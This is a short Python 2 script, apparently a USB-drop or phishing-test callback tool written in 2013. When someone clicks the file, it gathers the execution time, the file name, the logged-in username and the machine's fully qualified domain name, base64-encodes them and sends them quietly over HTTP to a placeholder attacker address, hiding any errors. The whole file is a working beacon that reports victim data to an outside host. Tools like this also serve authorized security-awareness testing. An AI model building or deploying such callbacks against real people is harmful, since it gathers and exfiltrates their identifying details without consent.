#!/usr/bin/python
import os
import sys
import socket
import base64
import urllib2
import getpass
from datetime import datetime

#############################################################################
##
##		USB Information Call Back
##
##		This program will collect the following:
##			- Time of Execution
##			- Name of File Clicked
##			- Username of the Logged in User
##			- FQDN of the machine is ran on
##
##		This program then send that to a remote location as determined by
##		the ".config" file.
##
##		Required attributes in the config program are:
##			- flag:	name of file to determine if the program has already 
##					executed to restrict it to a single execution
##			- hostname: fqdn or IP to connect to
##			- url:	folder/file path after the hostname to connect to
##			- debug: whether to run the program in debug mode or not
##
##		Written by Randy Armknecht, May 2013
##		Base64 is used due to limitations with py2exe
##
#############################################################################
	
mv_starttime = datetime.now()	# Time of Execution
mv_filename = sys.argv[0]		# Get Name of File Clicked
mv_uname = getpass.getuser()	# Get Username
mv_fqdn = socket.getfqdn()		# Get Fully Qualified Domain Name


# Collected Data
mv_data = "%s!%s!%s!%s" % (str(mv_starttime), mv_uname, mv_fqdn, mv_filename)
mv_b64data = base64.b64encode(mv_data)[:-1]
#if rules['debug'] == "True": print "[*] Data grabbed"

# Touch the URL
location = '<YOUR IP ADDRESS HERE>'+'?data='+mv_b64data
try:
	urllib2.urlopen(location).read()
except:
	pass

#if rules['debug'] == "True": print "[*] Sent to: %s" % (location)

# Set the "Run Once" flag
#filename = rules['flag']
#flag = open(filename, 'w')
#flag.write("1234567890")
#flag.close()

#if rules['debug'] == "True": print "[*] Wrote Flag: %s" % (filename)
